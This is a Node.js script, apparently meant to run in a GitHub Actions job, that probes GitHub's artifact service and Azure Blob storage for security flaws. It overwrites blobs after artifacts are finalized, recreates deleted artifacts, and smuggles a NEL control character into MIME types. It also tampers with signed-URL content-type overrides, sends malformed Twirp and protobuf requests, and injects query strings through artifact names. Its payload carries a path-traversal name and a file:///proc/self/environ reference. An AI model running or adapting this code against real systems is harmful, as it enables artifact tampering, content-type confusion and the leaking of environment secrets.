import { createHash } from 'node:crypto';
import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';

const repository = process.env.GITHUB_REPOSITORY;
const token = process.env.GITHUB_TOKEN;
if (!repository || !token) throw new Error('Missing GitHub repository or token');

const backendIds = getBackendIdsFromToken();
const client = internalArtifactTwirpClient();
const unusualType = 'application/json\u0085';
const placeholder = Buffer.from('{}');
const sha256 = data => createHash('sha256').update(data).digest('hex');
const apiHeaders = {
  Accept: 'application/vnd.github.v3+json',
  Authorization: `Bearer ${token}`,
  'User-Agent': 'repo-cassette-resurrection-probe',
};

async function publish(name, version, mimeType) {
  const created = await client.CreateArtifact({
    ...backendIds, name, version,
    mimeType: StringValue.create({ value: mimeType }),
  });
  if (!created.ok) throw new Error(`CreateArtifact failed: ${name}`);
  const blob = new BlobClient(created.signedUploadUrl).getBlockBlobClient();
  await blob.uploadData(placeholder, { blobHTTPHeaders: { blobContentType: unusualType } });
  const finished = await client.FinalizeArtifact({
    ...backendIds, name, size: String(placeholder.length),
    hash: StringValue.create({ value: `sha256:${sha256(placeholder)}` }),
  });
  if (!finished.ok) throw new Error(`FinalizeArtifact failed: ${name}`);
  return { id: finished.artifactId, blob };
}

function payload(id) {
  return Buffer.from(JSON.stringify({
    full_name: `x/../${repository}/actions/artifacts/${id}/zip`,
    owner: { login: 'pwn', avatar_url: 'file:///proc/self/environ' },
    description: 'resurrect',
    stargazers_count: 7,
  }));
}

async function inspect(id, expected) {
  const api = `https://api.github.com/repos/${repository}/actions/artifacts/${id}/zip`;
  const response = await fetch(api, { headers: apiHeaders, redirect: 'manual' });
  const location = response.headers.get('location');
  if (response.status !== 302 || !location) return { id, status: response.status };
  const downloaded = await fetch(location);
  const body = Buffer.from(await downloaded.arrayBuffer());
  const contentType = downloaded.headers.get('content-type');
  const type = (contentType || '').split(/[;,]/, 1)[0].toLowerCase();
  const match = body.equals(expected);
  return {
    id, status: downloaded.status, contentType, size: body.length,
    sha256: sha256(body), bodyMatch: match,
    candidate: match && type.trim() !== 'application/json' &&
      type.replace(/^[\s\u0085]+|[\s\u0085]+$/gu, '') === 'application/json',
  };
}

const produced = [];
for (let trial = 0; trial < 6; trial += 1) {
  const name = `cassette-resurrect-${process.env.GITHUB_RUN_ID}-${trial}-${Date.now()}`;
  const [firstVersion, secondVersion] = trial % 2 === 0 ? [6, 7] : [7, 6];
  const firstMime = firstVersion === 6 ? unusualType : 'application/json';
  const secondMime = secondVersion === 6 ? unusualType : 'application/json';
  try {
    const original = await publish(name, firstVersion, firstMime);
    const removed = await client.DeleteArtifact({ ...backendIds, name });
    if (!removed.ok) throw new Error(`DeleteArtifact failed: ${name}`);
    const replacement = await publish(name, secondVersion, secondMime);
    const body = payload(replacement.id);
    await replacement.blob.uploadData(body, {
      blobHTTPHeaders: { blobContentType: unusualType },
    });
    produced.push({ id: replacement.id, body });
    console.log(`RESURRECT ${JSON.stringify({ trial, firstVersion, secondVersion,
      deletedId: original.id, id: replacement.id, sha256: sha256(body) })}`);
  } catch (error) {
    console.log(`ERROR ${JSON.stringify({ trial, message: String(error) })}`);
  }
}

// Unlike the simultaneous creates above, this probes metadata changes when a
// second CreateArtifact arrives after the first record has been finalized.
for (const [firstVersion, secondVersion] of [[6, 7], [7, 6]]) {
  const name = `cassette-after-finalize-${process.env.GITHUB_RUN_ID}-${firstVersion}-${secondVersion}`;
  const firstMime = firstVersion === 6 ? unusualType : 'application/json';
  const secondMime = secondVersion === 6 ? unusualType : 'application/json';
  try {
    const first = await publish(name, firstVersion, firstMime);
    const firstBody = payload(first.id);
    await first.blob.uploadData(firstBody, { blobHTTPHeaders: { blobContentType: unusualType } });
    const second = await client.CreateArtifact({
      ...backendIds, name, version: secondVersion,
      mimeType: StringValue.create({ value: secondMime }),
    });
    console.log(`AFTER_FINALIZE_CREATE ${JSON.stringify({ firstVersion, secondVersion,
      firstId: first.id, ok: second.ok, hasUploadUrl: Boolean(second.signedUploadUrl),
      first: await inspect(first.id, firstBody) })}`);
    if (second.ok && second.signedUploadUrl) {
      const secondBlob = new BlobClient(second.signedUploadUrl).getBlockBlobClient();
      await secondBlob.uploadData(placeholder, { blobHTTPHeaders: { blobContentType: unusualType } });
      const sealed = await client.FinalizeArtifact({
        ...backendIds, name, size: String(placeholder.length),
        hash: StringValue.create({ value: `sha256:${sha256(placeholder)}` }),
      });
      if (sealed.ok) {
        const secondBody = payload(sealed.artifactId);
        await secondBlob.uploadData(secondBody, { blobHTTPHeaders: { blobContentType: unusualType } });
        console.log(`AFTER_FINALIZE_SECOND ${JSON.stringify({ firstVersion, secondVersion,
          firstId: first.id, secondId: sealed.artifactId,
          first: await inspect(first.id, firstBody),
          second: await inspect(sealed.artifactId, secondBody) })}`);
      }
    }
  } catch (error) {
    console.log(`AFTER_FINALIZE_ERROR ${JSON.stringify({ firstVersion, secondVersion, message: String(error) })}`);
  }
}

for (const { id, body } of produced) {
  try {
    console.log(`PROBE ${JSON.stringify(await inspect(id, body))}`);
  } catch (error) {
    console.log(`PROBE_ERROR ${JSON.stringify({ id, message: String(error) })}`);
  }
}

// Check whether signed response overrides can be interpreted differently by
// Azure's SAS validator and its response-header writer. Never print the SAS.
if (produced.length) {
  const { id, body } = produced[0];
  const api = `https://api.github.com/repos/${repository}/actions/artifacts/${id}/zip`;
  const redirect = await fetch(api, { headers: apiHeaders, redirect: 'manual' });
  const location = redirect.headers.get('location');
  if (location) {
    const variants = [
      ['control', u => u],
      ['duplicate-lower', u => { u.searchParams.append('rsct', '\u0085application/json'); return u; }],
      ['duplicate-upper', u => { u.searchParams.append('RSCT', '\u0085application/json'); return u; }],
      ['duplicate-reversed', u => { const old = u.searchParams.get('rsct'); u.searchParams.delete('rsct'); u.searchParams.append('rsct', '\u0085application/json'); u.searchParams.append('rsct', old); return u; }],
      ['alternate-parameter', u => { u.searchParams.append('response-content-type', '\u0085application/json'); return u; }],
      ['api-version-2009', u => { u.searchParams.append('api-version', '2009-09-19'); return u; }],
      ['api-version-2011', u => { u.searchParams.append('api-version', '2011-08-18'); return u; }],
      ['api-version-2012', u => { u.searchParams.append('api-version', '2012-02-12'); return u; }],
      ['encoded-key', u => `${u}&r%73ct=%85application%2Fjson`],
      ['semicolon-key', u => `${u};rsct=%85application%2Fjson`],
    ];
    for (const [label, mutate] of variants) {
      try {
        const candidate = mutate(new URL(location));
        const response = await fetch(String(candidate));
        const data = Buffer.from(await response.arrayBuffer());
        console.log(`SAS ${JSON.stringify({ label, status: response.status,
          contentType: response.headers.get('content-type'), bodyMatch: data.equals(body),
          bodySize: data.length })}`);
      } catch (error) {
        console.log(`SAS_ERROR ${JSON.stringify({ label, message: String(error) })}`);
      }
    }
  }
}

// Test overrides at the REST redirect boundary. A query parameter accepted by
// GitHub would be included in its own signed URL, unlike post-signature edits.
if (produced.length) {
  const id = produced[0].id;
  const api = `https://api.github.com/repos/${repository}/actions/artifacts/${id}/zip`;
  const cases = [
    ['control', ''],
    ['rsct', '?rsct=application%2Fjson%C2%85'],
    ['response-content-type', '?response-content-type=application%2Fjson%C2%85'],
    ['mime_type', '?mime_type=application%2Fjson%C2%85'],
    ['content_type', '?content_type=application%2Fjson%C2%85'],
    ['contentType', '?contentType=application%2Fjson%C2%85'],
    ['download', '?download=1&rsct=application%2Fjson%C2%85'],
    ['raw', '?raw=1&rsct=application%2Fjson%C2%85'],
    ['api-version-2009', '?api-version=2009-09-19'],
    ['api-version-2011', '?api-version=2011-08-18'],
    ['api-version-2012', '?api-version=2012-02-12'],
  ];
  for (const [label, suffix] of cases) {
    try {
      const response = await fetch(api + suffix, { headers: apiHeaders, redirect: 'manual' });
      const location = response.headers.get('location');
      const signed = location ? new URL(location) : null;
      console.log(`REST_OVERRIDE ${JSON.stringify({ label, status: response.status,
        target: signed?.hostname, rsct: signed?.searchParams.get('rsct'),
        apiVersion: signed?.searchParams.get('api-version'),
        responseType: response.headers.get('content-type') })}`);
    } catch (error) {
      console.log(`REST_OVERRIDE_ERROR ${JSON.stringify({ label, message: String(error) })}`);
    }
  }
}

for (const version of [0, 1, 2, 3, 4, 5, 7, 8, 9]) {
  const name = `cassette-version-${process.env.GITHUB_RUN_ID}-${version}-${Date.now()}`;
  try {
    const artifact = await publish(name, version, unusualType);
    const body = payload(artifact.id);
    await artifact.blob.uploadData(body, {
      blobHTTPHeaders: { blobContentType: unusualType },
    });
    console.log(`VERSION ${JSON.stringify({ version, ...await inspect(artifact.id, body) })}`);
  } catch (error) {
    console.log(`VERSION_ERROR ${JSON.stringify({ version, message: String(error) })}`);
  }
}

const pythonOnlySpace = [0x1c, 0x1d, 0x1e, 0x1f, 0x85];
for (const codepoint of pythonOnlySpace) {
  for (const side of ['before', 'after']) {
    const marker = String.fromCodePoint(codepoint);
    const mime = side === 'before' ? `${marker}application/json` : `application/json${marker}`;
    const name = `cassette-mime-${process.env.GITHUB_RUN_ID}-${codepoint}-${side}`;
    try {
      const artifact = await publish(name, 7, mime);
      const body = payload(artifact.id);
      await artifact.blob.uploadData(body, {
        blobHTTPHeaders: { blobContentType: unusualType },
      });
      console.log(`MIME ${JSON.stringify({ codepoint, side, ...await inspect(artifact.id, body) })}`);
    } catch (error) {
      console.log(`MIME_ERROR ${JSON.stringify({ codepoint, side, message: String(error) })}`);
    }
  }
}

// RFC token characters can hide a second decoding step in a signed URL.
// Check what the final Azure response actually emits, rather than trusting
// the CreateArtifact validation result.
for (const [label, mime] of [
  ['percent-85', 'application/json%85'],
  ['percent-c285', 'application/json%C2%85'],
  ['percent-2585', 'application/json%2585'],
  ['encoded-backslash-u', 'application/json\\u0085'],
  ['plus-85', 'application/json+%85'],
]) {
  const name = `cassette-encoded-mime-${process.env.GITHUB_RUN_ID}-${label}`;
  try {
    const artifact = await publish(name, 7, mime);
    const body = payload(artifact.id);
    await artifact.blob.uploadData(body);
    console.log(`ENCODED_MIME ${JSON.stringify({ label, mime, ...await inspect(artifact.id, body) })}`);
  } catch (error) {
    console.log(`ENCODED_MIME_ERROR ${JSON.stringify({ label, mime, message: String(error) })}`);
  }
}

const endpoint = new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', process.env.ACTIONS_RESULTS_URL);
const rawCases = [
  { label: 'scalar-valid', fields: '"mimeType":"application/json"' },
  { label: 'wrapper-valid', fields: '"mimeType":{"value":"application/json"}' },
  { label: 'camel-valid-snake-nel', fields: '"mimeType":"application/json","mime_type":"application/json\\u0085"' },
  { label: 'snake-nel-camel-valid', fields: '"mime_type":"application/json\\u0085","mimeType":"application/json"' },
  { label: 'duplicate-valid-nel', fields: '"mimeType":"application/json","mimeType":"application/json\\u0085"' },
  { label: 'duplicate-nel-valid', fields: '"mimeType":"application/json\\u0085","mimeType":"application/json"' },
];
for (const item of rawCases) {
  const name = `cassette-raw-${process.env.GITHUB_RUN_ID}-${item.label}`;
  const prefix = JSON.stringify({ ...backendIds, name, version: 7 }).slice(0, -1);
  const raw = `${prefix},${item.fields}}`;
  try {
    const reply = await fetch(endpoint, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,
        'Content-Type': 'application/json',
      },
      body: raw,
    });
    const response = await reply.json();
    if (!reply.ok || !response.ok || !response.signedUploadUrl) {
      console.log(`RAW_CREATE ${JSON.stringify({ label: item.label, status: reply.status, error: response.msg || response.message || response.code || 'rejected' })}`);
      continue;
    }
    const blob = new BlobClient(response.signedUploadUrl).getBlockBlobClient();
    await blob.uploadData(placeholder);
    const finished = await client.FinalizeArtifact({
      ...backendIds, name, size: String(placeholder.length),
      hash: StringValue.create({ value: `sha256:${sha256(placeholder)}` }),
    });
    const body = payload(finished.artifactId);
    await blob.uploadData(body);
    console.log(`RAW_CREATE ${JSON.stringify({ label: item.label, status: reply.status, ...await inspect(finished.artifactId, body) })}`);
  } catch (error) {
    console.log(`RAW_CREATE_ERROR ${JSON.stringify({ label: item.label, message: String(error) })}`);
  }
}

// Twirp also accepts protobuf wire format. Test whether its string decoding
// and MIME validation differ from the JSON path; never print signed URLs.
function varint(n) {
  const out = [];
  while (n >= 128) { out.push((n & 127) | 128); n >>>= 7; }
  out.push(n);
  return Buffer.from(out);
}
function wireBytes(field, data) {
  const bytes = Buffer.isBuffer(data) ? data : Buffer.from(String(data));
  return Buffer.concat([varint((field << 3) | 2), varint(bytes.length), bytes]);
}
function protobufCreate(name, mimeBytes) {
  const wrapped = wireBytes(1, mimeBytes);
  return Buffer.concat([
    wireBytes(1, backendIds.workflowRunBackendId),
    wireBytes(2, backendIds.workflowJobRunBackendId),
    wireBytes(3, name),
    varint(5 << 3), varint(7),
    wireBytes(6, wrapped),
  ]);
}
for (const [label, mimeBytes] of [
  ['wire-ascii-control', Buffer.from('application/json')],
  ['wire-invalid-utf8-suffix', Buffer.concat([Buffer.from('application/json'), Buffer.from([0x85])])],
  ['wire-invalid-utf8-prefix', Buffer.concat([Buffer.from([0x85]), Buffer.from('application/json')])],
  ['wire-utf8-nel', Buffer.from('application/json\u0085')],
]) {
  const name = `cassette-wire-${process.env.GITHUB_RUN_ID}-${label}`;
  try {
    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,
        'Content-Type': 'application/protobuf',
        Accept: 'application/protobuf',
      },
      body: protobufCreate(name, mimeBytes),
    });
    const bytes = Buffer.from(await response.arrayBuffer());
    const diagnostic = response.ok ? 'accepted' : bytes.toString('utf8').slice(0, 180);
    console.log(`WIRE_CREATE ${JSON.stringify({ label, status: response.status,
      contentType: response.headers.get('content-type'), responseBytes: bytes.length,
      diagnostic })}`);
  } catch (error) {
    console.log(`WIRE_CREATE_ERROR ${JSON.stringify({ label, message: String(error) })}`);
  }
}

const nameCases = [
  { label: 'amp-rsct', suffix: '&rsct=application/json%85' },
  { label: 'question-rsct', suffix: '?rsct=application/json%85' },
  { label: 'hash-rsct', suffix: '#rsct=application/json%85' },
  { label: 'percent-rsct', suffix: '%26rsct%3Dapplication%2Fjson%85' },
  { label: 'semicolon-rsct', suffix: ';rsct=application/json%85' },
  { label: 'encoded-nel', suffix: '%85' },
  { label: 'literal-nel', suffix: '\u0085' },
];
for (const item of nameCases) {
  const name = `cassette-name-${process.env.GITHUB_RUN_ID}-${item.label}${item.suffix}`;
  try {
    const artifact = await publish(name, 7, 'application/json');
    const body = payload(artifact.id);
    await artifact.blob.uploadData(body, {
      blobHTTPHeaders: { blobContentType: unusualType },
    });
    const api = `https://api.github.com/repos/${repository}/actions/artifacts/${artifact.id}/zip`;
    const redirect = await fetch(api, { headers: apiHeaders, redirect: 'manual' });
    const destination = redirect.headers.get('location');
    const signed = destination ? new URL(destination) : null;
    console.log(`NAME ${JSON.stringify({
      label: item.label, name, redirectStatus: redirect.status,
      storagePath: signed?.pathname, rsct: signed?.searchParams.get('rsct'),
      ...await inspect(artifact.id, body),
    })}`);
  } catch (error) {
    console.log(`NAME_ERROR ${JSON.stringify({ label: item.label, message: String(error) })}`);
  }
}

for (const [label, id] of [['v6', '12572447393'], ['v7', '12572307503']]) {
  for (const format of ['zip', 'raw', 'json', 'file', 'download', 'zip?archive_format=raw']) {
    const url = `https://api.github.com/repos/${repository}/actions/artifacts/${id}/${format}`;
    try {
      const response = await fetch(url, { headers: apiHeaders, redirect: 'manual' });
      const location = response.headers.get('location');
      const signed = location ? new URL(location) : null;
      console.log(`FORMAT ${JSON.stringify({
        label, format, status: response.status, contentType: response.headers.get('content-type'),
        targetHost: signed?.hostname, rsct: signed?.searchParams.get('rsct'),
      })}`);
    } catch (error) {
      console.log(`FORMAT_ERROR ${JSON.stringify({ label, format, message: String(error) })}`);
    }
  }
}

// Migration artifacts use a separate artifact-service path. Determine whether
// their public download preserves the blob's uploaded Content-Type.
async function migrationRpc(method, body) {
  const url = new URL(`/twirp/github.actions.results.api.v1.ArtifactService/${method}`,
    process.env.ACTIONS_RESULTS_URL);
  const response = await fetch(url, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(body),
  });
  const raw = await response.text();
  let document;
  try { document = JSON.parse(raw); } catch { document = {}; }
  return { status: response.status, document };
}
{
  const name = `cassette-migrated-${process.env.GITHUB_RUN_ID}`;
  const ids = { workflow_run_backend_id: backendIds.workflowRunBackendId, name };
  try {
    const created = await migrationRpc('MigrateArtifact', ids);
    if (created.status !== 200 || !created.document.signed_upload_url) {
      console.log(`MIGRATE ${JSON.stringify({ phase: 'create', status: created.status,
        error: created.document.msg || created.document.message || created.document.code })}`);
    } else {
      const blob = new BlobClient(created.document.signed_upload_url).getBlockBlobClient();
      await blob.uploadData(placeholder, {
        blobHTTPHeaders: { blobContentType: unusualType },
      });
      const sealed = await migrationRpc('FinalizeMigratedArtifact', {
        ...ids, size: String(placeholder.length),
      });
      const id = sealed.document.artifact_id;
      if (sealed.status !== 200 || !id) {
        console.log(`MIGRATE ${JSON.stringify({ phase: 'finalize', status: sealed.status,
          error: sealed.document.msg || sealed.document.message || sealed.document.code })}`);
      } else {
        const body = payload(id);
        await blob.uploadData(body, {
          blobHTTPHeaders: { blobContentType: unusualType },
        });
        const api = `https://api.github.com/repos/${repository}/actions/artifacts/${id}/zip`;
        const redirect = await fetch(api, { headers: apiHeaders, redirect: 'manual' });
        const location = redirect.headers.get('location');
        const signed = location ? new URL(location) : null;
        console.log(`MIGRATE ${JSON.stringify({ phase: 'probe', id,
          redirectStatus: redirect.status, rsct: signed?.searchParams.get('rsct'),
          ...(location ? await inspect(id, body) : {}) })}`);
      }
    }
  } catch (error) {
    console.log(`MIGRATE_ERROR ${JSON.stringify({ message: String(error) })}`);
  }
}
